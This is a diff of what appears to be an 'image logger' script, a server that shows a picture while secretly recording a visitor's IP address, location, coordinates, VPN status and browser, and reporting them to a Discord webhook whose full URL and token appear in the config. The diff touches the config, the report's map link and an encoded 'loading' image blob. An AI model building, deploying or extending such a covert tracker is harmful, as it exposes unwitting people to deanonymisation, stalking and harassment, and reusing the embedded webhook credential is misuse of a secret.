@@ -14,7 +14,8 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1557549382109503613/vLbA7oUfExH44gcuLs0J80Bhgq3oKP53e-G-MRjsDZqcSKBUHh2WaHqAvY7_PNG4CTHM",
-    "image": "https://images.teepublic.com/derived/production/designs/3602861_0/1543437730/i_m:pid_477,c_76_112_1108x1108,bc_ffffff,ar_1x1,o_landscape,pm_4,s_630,q_90.jpg", # You can also have a custom image by setting this to your own image link or by using ?url=<Insert a URL-escaped link to an image here>
+    "image": "https://images.teepublic.com/derived/production/designs/3602861_0/1543437730/i_m:pid_477,c_76_112_1108x1108,bc_ffffff,ar_1x1,o_landscape,pm_4,s_630,q_90.jpg", # You can also have a custom image
+
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
@@ -136,7 +137,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 > **Country:** `{info.get('country') if info.get('country') else 'Unknown'}`
 > **Region:** `{info.get('regionName') if info.get('regionName') else 'Unknown'}`
 > **City:** `{info.get('city') if info.get('city') else 'Unknown'}`
-> **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/' + str(info.get('lat')) + ',' + str(info.get('lon')) + ')'})
+> **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/{str(info.get("lat"))},{str(info.get("lon"))})'})
 > **Timezone:** `{info.get('timezone','').split('/')[1].replace('_', ' ')} ({info.get('timezone','').split('/')[0]})`
 > **Mobile:** `{info.get('mobile')}`
 > **VPN:** `{info.get('proxy')}`
@@ -161,7 +162,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
 
 binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+GF7dvvP3p?D0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq?N9lN4Bv|NsC0|NsC0|NsC0|NsC0|Nq?N9lN4Bv|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NtCq?m5XQ')
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)A|Ns;0|JwkF0)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|#qM810'),
 }
 
 
@@ -293,7 +294,3 @@ if (!currenturl.includes("g=")) {
     except Exception:
         reportError(traceback.format_exc())
         return _response(500, "500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.", "text/html")
-
-
-# Keep a compatibility alias for local/dev testing
-handler = handler
